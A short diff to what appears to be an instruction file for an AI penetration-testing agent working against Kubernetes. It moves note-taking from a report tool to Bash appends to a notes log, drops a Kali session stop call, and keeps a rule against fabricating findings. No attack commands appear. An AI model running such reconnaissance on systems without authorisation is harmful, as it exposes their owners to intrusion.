-- **Use `report(action="note", data={...})` liberally** — document K8s version, RBAC findings, pod configurations
+- **Use `Bash("echo '<message>' >> pentest/notes.log")` liberally** — document K8s version, RBAC findings, pod configurations
 - **Never fabricate findings** — only report what tool output confirms
 - **Mermaid syntax rules**: use `flowchart TD`, quote labels, no em-dashes, short alphanumeric node IDs
-- Call `session(action="stop_kali")` at the end if `kali(command=...)` was used
+- Call `# (no-op — tools native on Kali)` at the end if `Bash(...)` was used
